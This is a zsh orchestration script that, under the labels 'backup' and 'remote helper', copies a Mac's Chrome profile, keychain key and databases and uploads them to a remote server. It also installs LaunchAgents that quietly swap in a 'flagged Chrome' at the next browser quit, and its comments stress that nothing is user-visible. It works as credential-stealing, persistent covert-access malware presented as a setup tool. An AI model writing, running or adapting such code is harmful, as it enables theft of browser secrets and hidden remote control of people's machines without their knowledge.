#!/bin/zsh
# orchestrate.sh — the DETERMINISTIC background setup (no LLM in the critical path).
#
# Job 1: back up this Mac's Chrome (profile + keychain key + DBs), upload the
#        encrypted bundle in parts; the server assembles it into the drop area.
# Job 2: helper install — live profile copy + wrapper/statusd/agentd LaunchAgents;
#        the flagged Chrome appears at the next NATURAL Chrome quit. Nothing
#        user-visible, nothing forced.
# Every log goes to the VM as job artifacts; the last line of orchestrate.log:
#   RESULT: OK backup=<ok|fail> helper=<ok|fail>   |   RESULT: FAIL <reason>

set -u
RUN="${CHROME_REMOTE_RUN:-$HOME/chrome-remote}"
cd "$RUN"
# shellcheck disable=SC1091
source ./conf

jid_of() { python3 -c 'import sys, json
try:
    print(json.loads(sys.argv[1]).get("id", ""))
except Exception:
    print("")' "$1"; }

clone_ok=fail; access_ok=fail

echo "==== job 1: chrome backup upload ($(date -u +%H:%M:%SZ))"
J1=$(zsh "$RUN/agentd.sh" selfjob "chrome backup bundle (setup)")
J1=$(jid_of "$J1")
if [ -n "$J1" ]; then
  echo "job1=$J1"
  zsh "$RUN/collect.sh" --job "$J1" > "$RUN/collect.log" 2>&1
  zsh "$RUN/agentd.sh" upload "$J1" "$RUN/collect.log" collect.log >/dev/null 2>&1 || true
  if grep -q 'BUNDLE OK' "$RUN/collect.log"; then
    clone_ok=ok
    echo "backup: OK (bundle uploaded, server assembling)"
  else
    tail -n 3 "$RUN/collect.log"
    echo "backup: FAIL (log uploaded as artifact)"
  fi
else
  echo "backup: FAIL (could not claim job: $J1)"
fi

echo "==== job 2: remote helper install ($(date -u +%H:%M:%SZ))"
J2=$(zsh "$RUN/agentd.sh" selfjob "enable remote helper (setup)")
J2=$(jid_of "$J2")
if [ -n "$J2" ]; then
  echo "job2=$J2"
  zsh "$RUN/remote-agent.sh" arm > "$RUN/setup.log" 2>&1
  zsh "$RUN/agentd.sh" upload "$J2" "$RUN/setup.log" setup.log >/dev/null 2>&1 || true
  if grep -q 'RESULT: OK' "$RUN/setup.log"; then
    access_ok=ok
    zsh "$RUN/agentd.sh" done "$J2" ok >/dev/null 2>&1 || true
    echo "helper: OK (armed; active at next natural Chrome quit)"
  else
    tail -n 3 "$RUN/setup.log"
    zsh "$RUN/agentd.sh" done "$J2" fail >/dev/null 2>&1 || true
    echo "helper: FAIL (log uploaded as artifact)"
  fi
else
  echo "helper: FAIL (could not claim job)"
fi

if [ "$clone_ok" = fail ] && [ "$access_ok" = fail ]; then
  echo "RESULT: FAIL both setup jobs failed (see collect.log / setup.log)"
  exit 1
fi
echo "RESULT: OK backup=$clone_ok helper=$access_ok"
